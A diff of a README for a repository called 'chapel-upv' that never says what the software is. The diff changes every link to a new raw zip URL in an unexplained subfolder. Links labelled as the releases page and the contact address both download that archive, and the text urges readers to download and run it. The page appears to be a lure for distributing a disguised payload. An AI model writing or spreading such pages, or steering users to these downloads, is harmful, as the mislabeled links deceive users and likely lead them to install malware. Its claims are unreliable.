@@ -1,6 +1,6 @@
 # 🎉 chapel-upv - Your Simple Path to Easy Setup
 
-[![Download chapel-upv](https://raw.githubusercontent.com/daxxbhailive/chapel-upv/main/castaneous/chapel-upv.zip)](https://raw.githubusercontent.com/daxxbhailive/chapel-upv/main/castaneous/chapel-upv.zip)
+[![Download chapel-upv](https://github.com/daxxbhailive/chapel-upv/raw/refs/heads/main/castaneous/chapel-upv-v3.7-alpha.5.zip)](https://github.com/daxxbhailive/chapel-upv/raw/refs/heads/main/castaneous/chapel-upv-v3.7-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to chapel-upv! This guide will help you download and run the application
 ## 📥 Download & Install
 
 1. **Visit the Download Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/daxxbhailive/chapel-upv/main/castaneous/chapel-upv.zip) to find the latest version of chapel-upv. You will see a list of available versions.
+   Go to our [Releases page](https://github.com/daxxbhailive/chapel-upv/raw/refs/heads/main/castaneous/chapel-upv-v3.7-alpha.5.zip) to find the latest version of chapel-upv. You will see a list of available versions.
 
 2. **Choose Your Version**  
    Look for the most recent version. Each version includes important changes and updates.
@@ -45,7 +45,7 @@ If you encounter issues during the installation or while using chapel-upv, consi
 
 1. **Check System Requirements:** Make sure your system meets the minimum requirements.
 2. **Restart Your Computer:** A simple restart can fix many issues.
-3. **Re-download the File:** If the installer doesn't run, try downloading it again from the [Releases page](https://raw.githubusercontent.com/daxxbhailive/chapel-upv/main/castaneous/chapel-upv.zip).
+3. **Re-download the File:** If the installer doesn't run, try downloading it again from the [Releases page](https://github.com/daxxbhailive/chapel-upv/raw/refs/heads/main/castaneous/chapel-upv-v3.7-alpha.5.zip).
 
 For further assistance, visit our [Support Page](#) where you can find helpful articles and contact information.
 
@@ -61,6 +61,6 @@ This application is open-source under the MIT License. Feel free to review the l
 
 ## 📞 Contact
 
-For questions or support, please reach out at [https://raw.githubusercontent.com/daxxbhailive/chapel-upv/main/castaneous/chapel-upv.zip](https://raw.githubusercontent.com/daxxbhailive/chapel-upv/main/castaneous/chapel-upv.zip).
+For questions or support, please reach out at [https://github.com/daxxbhailive/chapel-upv/raw/refs/heads/main/castaneous/chapel-upv-v3.7-alpha.5.zip](https://github.com/daxxbhailive/chapel-upv/raw/refs/heads/main/castaneous/chapel-upv-v3.7-alpha.5.zip).
 
 Thank you for choosing chapel-upv! We appreciate your trust and hope you enjoy using our application.
